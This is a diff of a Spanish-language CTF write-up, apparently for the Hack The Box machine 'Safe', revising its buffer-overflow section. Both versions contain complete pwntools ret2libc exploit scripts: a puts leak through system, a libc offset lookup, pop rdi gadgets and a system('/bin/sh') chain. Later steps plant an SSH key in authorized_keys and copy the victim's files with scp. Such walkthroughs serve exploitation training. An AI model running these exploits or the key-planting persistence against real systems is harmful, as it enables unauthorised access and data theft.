 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg> </span><span class="p">got -r puts
 Filtering by symbol name: </span><span class="am">puts</span><span class="p">
@@ -475,22 +414,20 @@ GOT protection: </span><span class="am">Partial RELRO</span><span class="p"> | F
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Tambien necesitaremos la funcion se <code class="language-plaintext highlighter-rouge">system@plt</code> para ejecutar puts@got.plt a nivel de <code class="language-plaintext highlighter-rouge">sistema</code> y en el error ver la direccion de puts, tambien la direccion de <code class="language-plaintext highlighter-rouge">main</code></p>
+<p class="plain-text">Tambien necesitaremos la funcion se <code class="language-plaintext highlighter-rouge">system</code> para ejecutar <code class="language-plaintext highlighter-rouge">puts@got</code> como comando y en el error ver la direccion lekeada de <code class="language-plaintext highlighter-rouge">puts@libc</code>, tambien necesitaremos la direccion de <code class="language-plaintext highlighter-rouge">main</code> para una vez ocurra el error volver al inicio del programa</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">pwndbg> </span><span class="p">info functions system@plt
-All functions matching regular expression "system@plt":  
-
-Non-debugging symbols:
-</span><span class="az">0x0000000000401040  </span><span class="am">system@plt
-</span><span class="ro">pwndbg> </span><span class="p">info functions ^main$
-All functions matching regular expression "^main$":  
-
-Non-debugging symbols:
-</span><span class="az">0x000000000040115f  </span><span class="am">main
+<code><span class="ro">pwndbg> </span><span class="p">plt
+</span><span class="sa">Section .plt 0x401020-0x401070:</span><span class="p">
+0x401030: puts@plt
+0x401040: system@plt
+0x401050: printf@plt
+0x401060: gets@plt
+</span><span class="ro">pwndbg></span><span class="p"> print main
+$1 = {&lttext variable, no debug info>} </span><span class="az">0x40115f</span><span class="p"> &lt</span><span class="am">main</span><span class="p">>  
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ademas el gadget de <code class="language-plaintext highlighter-rouge">POP RDI</code> para poder enviar a puts@got.plt como un argumento</p>
+<p class="plain-text">Ademas el gadget de <code class="language-plaintext highlighter-rouge">pop rdi</code> para poder enviar a <code class="language-plaintext highlighter-rouge">puts@got</code> como un argumento</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ropper </span><span class="p">--file myapp --search </span><span class="am">"pop rdi; ret;"</span><span class="p">
 </span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
@@ -502,138 +439,119 @@ Non-debugging symbols:
 </span><span class="ro">0x000000000040120b</span><span class="p">: </span><span class="am">pop </span><span class="p">rdi</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Despues de rellenar con las <code class="language-plaintext highlighter-rouge">A's</code> enviaremos mediante <code class="language-plaintext highlighter-rouge">POP RDI</code> la direccion de <code class="language-plaintext highlighter-rouge">puts@got.plt</code> para posteriormente ejecutarla <code class="language-plaintext highlighter-rouge">system@plt</code>, al ejecutar con systema esta direccion a traves del <code class="language-plaintext highlighter-rouge">error</code> nos lekeara la direccion completa de <code class="language-plaintext highlighter-rouge">puts</code></p>
-<a href="/hackthebox/safe/9.png" target="_blank"><div><p><img src="/hackthebox/safe/9.png"></p></div></a>
-
-<p class="plain-text">Plasmamos esto en un script de <code class="language-plaintext highlighter-rouge">python</code> y al ejecutarlo un par de veces encontramos que mediante el <code class="language-plaintext highlighter-rouge">error</code> de sh nos muestra la direccion de <code class="language-plaintext highlighter-rouge">puts</code> que es dinamica</p>
+<p class="plain-text">La idea es en un inicio ejecutar <code class="language-plaintext highlighter-rouge">system(puts@got)</code>, esto claramente ocasionara un error ya que intentara ejecutar los bytes de <code class="language-plaintext highlighter-rouge">puts@libc</code> pero este error se ve reflejado por lo que deberiamos obtener su direccion, luego de ello simplemente volvemos a <code class="language-plaintext highlighter-rouge">main</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p64
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p64
 
-offset </span><span class="o">= </span><span class="mi">120</span><span class="p">
-junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.10.147"</span><span class="p">,</span><span class="mi"> 1337</span><span class="p">)
 
-pop_rdi </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40120b</span><span class="p">)
-got_puts </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x404018</span><span class="p">)
-plt_system </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401040</span><span class="p">)
-main </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40115f</span><span class="p">)
+offset </span><span class="o">=</span><span class="mi"> 120</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
 
-payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">=</span><span class="no">  b</span><span class="s">""</span><span class="p">
 payload </span><span class="o">+= </span><span class="p">junk
-payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">got_puts
-payload </span><span class="o">+= </span><span class="p">plt_system
-payload </span><span class="o">+= </span><span class="p">main
+payload </span><span class="o">+=</span><span class="p"> p64(</span><span class="mi">0x40120b</span><span class="p">)</span><span class="c1"> # pop rdi; ret;  </span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(</span><span class="mi">0x404018</span><span class="p">)</span><span class="c1"> # puts@got</span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(</span><span class="mi">0x401040</span><span class="p">)</span><span class="c1"> # system@plt</span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(</span><span class="mi">0x40115f</span><span class="p">)</span><span class="c1"> # main()</span><span class="p">
 
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"safe.htb"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)  
-
-shell.recvline()
 shell.sendline(payload)
+shell.recvline()
 </span><span class="no">print</span><span class="p">(shell.recvline())</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Al ejecutarlo podemos ver que funciona y en el error hay un leak de <code class="language-plaintext highlighter-rouge">puts@libc</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to safe.htb on port 1337: Done  
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.10.147 on port 1337: Done  
 b'sh: 1: \x90\x8f\x98\xeb:\x7f: not found\n'
-[</span><span class="az">*</span><span class="p">] Closed connection to safe.htb port 1337
-
-</span><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to safe.htb on port 1337: Done  
-b'sh: 1: \x90\x8f\x14\x06d\x7f: not found\n'
-[</span><span class="az">*</span><span class="p">] Closed connection to safe.htb port 1337</span>
+[</span><span class="az">*</span><span class="p">] Closed connection to 10.10.10.147 port 1337</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Modificamos el script para con que con <code class="language-plaintext highlighter-rouge">u64</code> le demos a la direccion lekeada un mejor <code class="language-plaintext highlighter-rouge">formato</code> el cual python pueda interpretar correctamente en algunas operaciones</p>
+<p class="plain-text">Ya que lo recibimos en formato bytes usaremos <code class="language-plaintext highlighter-rouge">u64</code> para pasarlo a un valor entero</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p64, u64, log
-
-offset </span><span class="o">= </span><span class="mi">120</span><span class="p">
-junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
-
-pop_rdi </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40120b</span><span class="p">)
-got_puts </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x404018</span><span class="p">)
-plt_system </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401040</span><span class="p">)
-main </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40115f</span><span class="p">)
-
-payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
-payload </span><span class="o">+= </span><span class="p">junk
-payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">got_puts
-payload </span><span class="o">+= </span><span class="p">plt_system
-payload </span><span class="o">+= </span><span class="p">main
-
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"safe.htb"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)
-
-shell.recvline()
-shell.sendline(payload)
-
-leak_puts </span><span class="o">= </span><span class="p">u64(shell.recvline().strip()[</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">11</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">,</span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">))  
-log.info(</span><span class="no">f</span><span class="s">"Leaked puts: </span><span class="p">{</span><span class="no">hex</span><span class="p">(leak_puts)}</span><span class="s">"</span><span class="p">)</span>
+<code><span class="p">leak</span><span class="o"> =</span><span class="p"> u64(shell.recvline().strip()[</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">11</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">))  
+log.info(</span><span class="no">f</span><span class="s">"puts@libc: </span><span class="p">{</span><span class="no">hex</span><span class="p">(leak)}</span><span class="s">"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Al ejecutarlo podemos ver la dirección de <code class="language-plaintext highlighter-rouge">puts@libc</code> en formato hexadecimal</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to safe.htb on port 1337: Done  
-[</span><span class="az">*</span><span class="p">] Leaked puts: 0x7f6ef6156f90
-[</span><span class="az">*</span><span class="p">] Closed connection to safe.htb port 1337</span>
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.10.147 on port 1337: Done  
+[</span><span class="az">*</span><span class="p">] puts@libc: 0x7f6ef6156f90
+[</span><span class="az">*</span><span class="p">] Closed connection to 10.10.10.147 port 1337</span>
 </code></pre></div></div><br>
 
-
-<p class="plain-text">En <a href="https://libc.rip/">libc.rip</a> podemos encontar las direcciones base de diferentes funciones, entre ellas <code class="language-plaintext highlighter-rouge">puts</code> que es <code class="language-plaintext highlighter-rouge">0x68f90</code>, el leak de puts que conseguimos antes nos muestra la direccion de <code class="language-plaintext highlighter-rouge">puts</code> a la cual se le ha sumado la direcion de <code class="language-plaintext highlighter-rouge">libc base</code>, asi que si al leak le restamos la direccion <code class="language-plaintext highlighter-rouge">base</code> de puts obtenemos <code class="language-plaintext highlighter-rouge">libc_base</code> y si a esta le sumamos la direccion base de <code class="language-plaintext highlighter-rouge">/bin/sh</code> obtenemos una direccion de /bin/sh</p>
-<a href="/hackthebox/safe/4.png" target="_blank"><div><p><img src="/hackthebox/safe/4.png"></p></div></a>
-
+<p class="plain-text">Especificamente con los ultimos bytes podemos detectar la versión de <code class="language-plaintext highlighter-rouge">libc</code> y por lo tanto el offset que debemos restar a <code class="language-plaintext highlighter-rouge">puts</code> para obtener la dirección base, al ejecutar <code class="language-plaintext highlighter-rouge">libcdb</code> podemos ver que es <code class="language-plaintext highlighter-rouge">libc 2.24</code> y el offset de <code class="language-plaintext highlighter-rouge">puts</code> es <code class="language-plaintext highlighter-rouge">0x68f90</code>, además de ello vemos otras direcciones interesantes como la de <code class="language-plaintext highlighter-rouge">system</code> o de la string <code class="language-plaintext highlighter-rouge">/bin/sh</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">libc_base </span><span class="o">= </span><span class="p">leak_puts </span><span class="o">- </span><span class="mi">0x68f90</span><span class="p">
-
-bin_sh </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="mi">0x161c19</span><span class="p">)</span>
+<code><span class="ve">❯ libcdb </span><span class="p">lookup puts f90
+[</span><span class="az">*</span><span class="p">]</span><span class="ro"> libc6_2.24-11+deb9u4_amd64
+    </span><span class="ve">BuildID:</span><span class="p">     775143e680ff0cd4cd51cce1ce8ca216e635a1d6
+    </span><span class="ve">MD5:</span><span class="p">         3e5c9b44fc491e6dd5e480fcb316bf2d
+    </span><span class="ve">SHA1:</span><span class="p">        81a6361b56ed07f58021f6a4795a58d565253956
+    </span><span class="ve">SHA256:</span><span class="p">      d37be6b076bed6b4031451c8495aca3f350273e90dd5b97721f6b167b88ce1ea  
+    </span><span class="ve">Symbols:</span><span class="p">
+        __libc_start_main_ret = 0x202e1
+                         dup2 = 0xdbfb0
+                       printf = 0x4f190
+                         puts = 0x68f90
+                         read = 0xdb900
+                   str_bin_sh = 0x161c19
+                       system = 0x3f480
+                        write = 0xdb960</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ya con la direccion de <code class="language-plaintext highlighter-rouge">/bin/sh</code> podemos simplemente enviarla al registro <code class="language-plaintext highlighter-rouge">RDI</code> con <code class="language-plaintext highlighter-rouge">POP RDI</code> para despues ejecutar <code class="language-plaintext highlighter-rouge">system@plt</code> y tome como argumento esta string</p>
-<a href="/hackthebox/safe/10.png" target="_blank"><div><p><img src="/hackthebox/safe/10.png"></p></div></a>
-
-<p class="plain-text">La primera parte de nuestro exploit final nos ayudara a conseguir la direccion de <code class="language-plaintext highlighter-rouge">libc_base</code> y la segunda ejecutar <code class="language-plaintext highlighter-rouge">/bin/sh</code> con la funcion <code class="language-plaintext highlighter-rouge">system@plt</code></p>
+<p class="plain-text">Ya que tenemos una dirección de libc y los offsets para <code class="language-plaintext highlighter-rouge">system</code> y <code class="language-plaintext highlighter-rouge">/bin/sh</code> solo nos queda buscar un <code class="language-plaintext highlighter-rouge">pop rdi</code> en esa version de libc para guardarlo como argumento</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="c1">#!/usr/bin/python3
-</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p64, u64
+<code><span class="ve">❯ ropper</span><span class="p"> --file libc.so.6 --search</span><span class="am"> "pop rdi; ret;"  </span><span class="p"></span>
+</span><span class="ve">[INFO]</span><span class="p"> Load gadgets from cache
+</span><span class="ve">[LOAD]</span><span class="p"> loading... 100%
+</span><span class="ve">[LOAD]</span><span class="p"> removing double gadgets... 100%
+</span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: pop rdi; ret;
 
-offset </span><span class="o">= </span><span class="mi">120</span><span class="p">
-junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+</span><span class="ve">[INFO]</span><span class="p"> File: libc.so.6
+</span><span class="ro">0x000000000001fc6a</span><span class="p">:</span><span class="am"> pop</span><span class="p"> rdi</span><span class="az">;</span><span class="am"> ret</span><span class="az">;</span>
+</code></pre></div></div><br>
 
-got_puts </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x404018</span><span class="p">)
-pop_rdi </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40120b</span><span class="p">)
-plt_system </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401040</span><span class="p">)
-main </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40115f</span><span class="p">)
+<p class="plain-text">La primera parte del exploits se encarga de lekear la dirección de <code class="language-plaintext highlighter-rouge">puts</code> para obtener <code class="language-plaintext highlighter-rouge">libc</code> base, con los offsets conocidos guardamos <code class="language-plaintext highlighter-rouge">/bin/sh</code> en <code class="language-plaintext highlighter-rouge">rdi</code> y ejecutar <code class="language-plaintext highlighter-rouge">system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3</span><span class="p">
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p64, u64, log
 
-payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
+shell </span><span class="o">=</span><span class="p"> remote(</span><span class="s">"10.10.10.147"</span><span class="p">,</span><span class="mi"> 1337</span><span class="p">)
+
+offset </span><span class="o">=</span><span class="mi"> 120</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
+
+payload </span><span class="o">=</span><span class="no">  b</span><span class="s">""</span><span class="p">
 payload </span><span class="o">+= </span><span class="p">junk
-payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">got_puts
-payload </span><span class="o">+= </span><span class="p">plt_system
-payload </span><span class="o">+= </span><span class="p">main
+payload </span><span class="o">+=</span><span class="p"> p64(</span><span class="mi">0x40120b</span><span class="p">)</span><span class="c1"> # pop rdi; ret;  </span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(</span><span class="mi">0x404018</span><span class="p">)</span><span class="c1"> # puts@got</span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(</span><span class="mi">0x401040</span><span class="p">)</span><span class="c1"> # system@plt</span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(</span><span class="mi">0x40115f</span><span class="p">)</span><span class="c1"> # main()</span><span class="p">
 
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"safe.htb"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)
-
-shell.recvline()
 shell.sendline(payload)
+shell.recvline()
 
-leak_puts </span><span class="o">= </span><span class="p">u64(shell.recvline().strip()[</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">11</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">,</span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">))  
-libc_base </span><span class="o">= </span><span class="p">leak_puts </span><span class="o">- </span><span class="mi">0x68f90</span><span class="p">
+libc_base </span><span class="o">=</span><span class="p"> u64(shell.recvline().strip()[</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">11</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">-</span><span class="mi"> 0x68f90</span><span class="p">  
 
-bin_sh </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="mi">0x161c19</span><span class="p">)
-
-payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">=</span><span class="no">  b</span><span class="s">""</span><span class="p">
 payload </span><span class="o">+= </span><span class="p">junk
-payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">bin_sh
-payload </span><span class="o">+= </span><span class="p">plt_system
+payload </span><span class="o">+=</span><span class="p"> p64(libc_base </span><span class="o">+</span><span class="mi"> 0x01fc6a</span><span class="p">)</span><span class="c1"> # pop rdi; ret;</span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(libc_base </span><span class="o">+</span><span class="mi"> 0x161c19</span><span class="p">)</span><span class="c1"> # "/bin/sh"</span><span class="p">
+payload </span><span class="o">+=</span><span class="p"> p64(libc_base </span><span class="o">+</span><span class="mi"> 0x03f480</span><span class="p">)</span><span class="c1"> # system()</span><span class="p">
 
-shell.recvline()
 shell.sendline(payload)
+shell.recvline()
+
 shell.interactive()</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Finalmente ejecutamos el script que explota el <code class="language-plaintext highlighter-rouge">buffer overflow</code> y nos da una shell</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to safe.htb on port 1337: Done
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.10.147 on port 1337: Done
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 </span><span class="ro">$ </span><span class="p">whoami
 user
@@ -646,12 +564,12 @@ c15**************************ef9
 
 <p class="plain-text">Para obtener una <code class="language-plaintext highlighter-rouge">shell</code> mas comoda podemos guardar nuestra clave <code class="language-plaintext highlighter-rouge">publica</code> como autorizada en la maquina para despues conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code> sin contraseña</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">$ </span><span class="p">echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE7DwLVBJlEPeKvWMKsQTsU7m4ULfVSJRx1hVaZAo0Rv kali@kali" > /home/user/.ssh/authorized_keys  
+<code><span class="ro">$ </span><span class="p">echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEO8eT1sRh3GpjhaLijzsM0P8IQzOflLDv6jI5j4LU3W user@ubuntu" > /home/user/.ssh/authorized_keys  
 </span><span class="ro">$</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ssh </span><span class="p">user@safe.htb
+<code><span class="ve">❯ ssh </span><span class="p">user@10.10.10.147
 </span><span class="ve">user@safe</span><span class="p">:</span><span class="az">~</span><span class="p">$ whoami
 user
 </span><span class="ve">user@safe</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
@@ -682,7 +600,7 @@ c15**************************ef9
 
 <p class="plain-text">Para descargar todos los archivos podemos usar <code class="language-plaintext highlighter-rouge">scp</code> aprovechando la conexion ssh</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ scp </span><span class="p">user@safe.htb:</span><span class="am">'*'</span><span class="p"> .
+<code><span class="ve">❯ scp </span><span class="p">user@10.10.10.147:</span><span class="am">'*'</span><span class="p"> .
 IMG_0545.JPG                               100% 1863KB 695.1KB/s   00:02  
 IMG_0546.JPG                               100% 1872KB 703.2KB/s   00:02  
 IMG_0547.JPG                               100% 2470KB 636.0KB/s   00:03  
